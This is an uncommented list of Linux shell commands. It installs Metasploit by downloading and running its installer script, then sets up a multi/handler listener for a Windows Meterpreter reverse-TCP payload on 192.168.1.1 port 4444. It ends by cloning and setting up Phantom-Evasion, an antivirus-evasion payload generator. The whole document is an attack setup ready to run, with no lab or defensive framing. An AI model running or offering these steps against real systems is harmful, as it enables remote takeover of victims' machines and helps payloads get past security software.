sudo apt update
sudo apt dist-upgrade
sudo apt autoremove
cd /tmp
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall
msfconsole
msfdb init
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.1
set lport 4444
run

git clone https://github.com/oddcod3/Phantom-Evasion.git
chmod +x ./phantom-evasion.py
./phantom-evasion.py --setup
